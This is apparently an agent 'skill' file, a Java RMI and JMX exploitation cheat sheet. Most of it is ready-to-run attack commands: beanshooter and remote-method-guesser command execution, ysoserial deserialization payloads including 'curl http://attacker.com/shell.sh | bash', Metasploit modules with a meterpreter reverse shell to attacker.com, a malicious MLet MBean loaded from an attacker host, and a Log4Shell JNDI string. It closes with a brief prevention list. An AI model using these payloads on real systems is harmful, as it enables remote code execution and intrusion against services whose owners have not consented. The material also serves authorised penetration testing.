---
name: java-rmi
description: Java RMI exploitation and deserialization attacks. Use when testing Java RMI services.
---

# Java RMI Exploitation

## Description
Java Remote Method Invocation (RMI) allows objects running in one Java Virtual Machine (JVM) to invoke methods on objects running in another JVM. Misconfigured RMI services can lead to remote code execution, deserialization attacks, and unauthorized access.

## Default Ports

```
1099 - RMI Registry (default)
1098 - RMI Activation
Custom ports for remote objects
```

## Detection

### Nmap Scanning
```bash
# Basic RMI detection
nmap -sV -p 1099 target.com

# RMI vulnerability scripts
nmap --script rmi-vuln-classloader -p 1099 target.com
nmap --script rmi-dumpregistry -p 1099 target.com

# All RMI scripts
nmap --script "rmi-*" -p 1099 target.com
```

### Remote Method Guesser
```bash
# https://github.com/qtc-de/remote-method-guesser

# Enumerate RMI service
rmg enum target.com 1099

# Scan for known vulnerabilities
rmg scan target.com 1099

# List bound names
rmg enum target.com 1099 --bound-names
```

## Exploitation Techniques

### 1. Beanshooter Attacks

```bash
# https://github.com/qtc-de/beanshooter

# List attributes via JMX
beanshooter info target.com 1099

# Enumerate JMX
beanshooter enum target.com 1099

# Brute force credentials
beanshooter brute target.com 1099

# Execute commands
beanshooter exec target.com 1099 "id"

# Deploy malicious MBean
beanshooter mbean target.com 1099

# Deserialization attack
beanshooter serial target.com 1099 CommonsCollections6 "curl attacker.com"
```

### 2. SJET/MJET Exploitation

**Requirements:**
- Jython
- HTTP server for hosting payloads
- Unauthenticated or weak JMX authentication

**Setup:**
```bash
# Clone SJET
git clone https://github.com/siberas/sjet.git

# Generate malicious MBean
# Create MBean that executes commands
```

**Attack:**
```bash
# Install malicious MBean
jython sjet.py target.com 1099 install http://attacker.com:8080/ 8080

# Execute command
jython sjet.py target.com 1099 command "id"

# Uninstall MBean
jython sjet.py target.com 1099 uninstall
```

**MJET (Metasploit):**
```bash
# Alternative using Metasploit modules
msfconsole
use exploit/multi/misc/java_jmx_server
set RHOSTS target.com
set RPORT 1099
run
```

### 3. Metasploit RMI Exploits

```bash
# RMI Registry exploit
use exploit/multi/misc/java_rmi_server
set RHOSTS target.com
set RPORT 1099
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST attacker.com
run

# JMX exploit
use exploit/multi/misc/java_jmx_server
set RHOSTS target.com
set RPORT 1099
run
```

### 4. Deserialization Attacks

```bash
# Using ysoserial
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/shell.sh | bash" > payload.bin

# Send via RMI
# Use rmg or custom client

# Using remote-method-guesser
rmg serial target.com 1099 CommonsCollections6 "id"
```

### 5. Class Loading Attack

If remote class loading is enabled:

```java
// Malicious class
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("id");
        } catch (Exception e) {}
    }
}
```

```bash
# Host class on HTTP server
python -m http.server 8080

# Exploit loads class from attacker's server
```

## JMX Exploitation

### Connect to JMX
```bash
# Using jconsole
jconsole target.com:1099

# Using jmxterm
java -jar jmxterm.jar
open target.com:1099
```

### MLet Attack
```xml
<!-- mlet.xml hosted on attacker server -->
<html>
<mlet code="malicious.MBean" archive="malicious.jar" codebase="http://attacker.com/" name="malicious:name=Pwned">
</mlet>
</html>
```

```java
// Attack sequence
1. Create javax.management.loading.MLet MBean
2. Call getMBeansFromURL("http://attacker.com/mlet.xml")
3. Invoke methods on malicious MBean
```

## Common Vulnerabilities

### CVE-2011-3556 (RMI Registry)
```bash
# Default configuration RCE
# Metasploit: exploit/multi/misc/java_rmi_server
```

### CVE-2017-3241 (JRMP)
```bash
# Java deserialization via JRMP
use exploit/multi/misc/java_jmx_server
```

### Log4Shell via RMI
```bash
# If Log4j is present
rmg serial target.com 1099 JNDIExploit "${jndi:ldap://attacker.com/a}"
```

## Testing Checklist

- [ ] Scan for RMI services (port 1099 and others)
- [ ] Enumerate bound objects
- [ ] Check for authentication
- [ ] Test deserialization vulnerabilities
- [ ] Check for remote class loading
- [ ] Test JMX access
- [ ] Look for MLet MBean
- [ ] Check Java version for known CVEs

## Tools Summary

| Tool | Purpose |
|------|---------|
| remote-method-guesser | RMI enumeration and exploitation |
| beanshooter | JMX/MBean attacks |
| ysoserial | Deserialization payloads |
| SJET/MJET | MLet-based attacks |
| Metasploit | Various RMI exploits |

## Prevention

```
1. Disable remote class loading
2. Use authentication for RMI/JMX
3. Restrict network access to RMI ports
4. Keep Java updated
5. Remove vulnerable libraries
6. Use SSL/TLS for RMI connections
7. Implement proper firewall rules
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java%20RMI
- https://github.com/qtc-de/remote-method-guesser
- https://github.com/qtc-de/beanshooter
